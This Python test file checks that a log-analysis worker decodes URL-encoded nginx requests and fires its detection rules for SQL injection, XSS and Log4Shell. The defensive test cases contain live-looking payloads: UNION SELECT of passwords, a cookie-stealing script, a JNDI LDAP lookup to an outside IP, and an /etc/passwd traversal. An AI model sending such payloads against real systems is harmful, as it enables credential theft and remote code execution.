# tests/worker/test_web_payload_decoding.py
"""Web attacks arrive URL-encoded; rules are written against the decoded text.
Real nginx lines with encoded payloads must decode and fire the shipped rules."""
import asyncio
import glob
import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../../worker"))

import pytest  # noqa: E402

from worker.decoder_engine import DecoderEngine, url_decode  # noqa: E402
from worker.sigma_engine import SigmaEngine  # noqa: E402

ROOT = os.path.join(os.path.dirname(__file__), "../..")


@pytest.fixture(scope="module")
def engines():
    import yaml
    decs = sorted((open(p).read() for p in glob.glob(os.path.join(ROOT, "decoders/*.yaml"))),
                  key=lambda c: yaml.safe_load(c).get("priority", 100))
    dec = DecoderEngine()
    dec.load_from_yaml_list(decs)
    sig = SigmaEngine()
    sig.load_from_yaml_list([open(p).read() for p in sorted(glob.glob(os.path.join(ROOT, "rules/*.yaml")))])
    assert not sig.load_errors, sig.load_errors
    return dec, sig


def _line(path):
    # a source IP per request: rule suppression (timewindow) would hide repeats from one IP
    ip = f"45.9.{len(path) % 250}.{sum(map(ord, path)) % 250 + 1}"
    return (f'{ip} - - [20/Oct/2026:09:00:00 +0700] "GET {path} HTTP/1.1" 403 150 "-" '
            '"Mozilla/5.0 (X11; Linux x86_64)"')


def _titles(engines, path):
    dec, sig = engines
    line = _line(path)
    event = dec.decode("nginx_access_combined", line)
    matches = asyncio.run(sig.evaluate(dict(event, raw_message=line, log_type="nginx_access_combined")))
    return event, {m["title"] for m in matches}


def test_url_decode():
    assert url_decode("/s?q=1%27%20UNION%20SELECT+a,b--") == "/s?q=1' UNION SELECT a,b--"
    assert url_decode("/a%252e%252e%252fetc%252fpasswd") == "/a../etc/passwd"  # double-encoded
    assert url_decode("/c++/guide?x=a+b") == "/c++/guide?x=a b"  # '+' is a space only in the query
    assert url_decode("/f?x=%00") == "/f?x=%00"  # NUL stays visible (JSONB rejects it)
    assert url_decode("/plain/path") == "/plain/path"


@pytest.mark.parametrize("path,title", [
    ("/search?q=1%27%20UNION%20SELECT%20username,password%20FROM%20users--", "SQL Injection Attempt"),
    ("/item?id=1+union+all+select+null,version()--", "SQL Injection Attempt"),
    ("/p?id=1%20AND%20SLEEP(5)", "SQL Injection Attempt"),
    ("/q?name=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E", "Cross-Site Scripting (XSS) Attempt"),
    ("/x?u=%24%7Bjndi%3Aldap%3A%2F%2F45.9.20.1%2Fa%7D", "Log4Shell Exploitation Attempt (CVE-2021-44228)"),
])
def test_encoded_payloads_fire(engines, path, title):
    event, titles = _titles(engines, path)
    assert title in titles, (event.get("url.path"), sorted(titles))
    assert event["url.original"].startswith(path.split("?")[0])  # the raw request is kept


def test_plain_requests_stay_quiet(engines):
    for path in ("/blog/2026/10/union-select-explained", "/search?q=select+a+plan", "/c++/guide"):
        _, titles = _titles(engines, path)
        assert not {t for t in titles if "Injection" in t or "XSS" in t}, (path, titles)
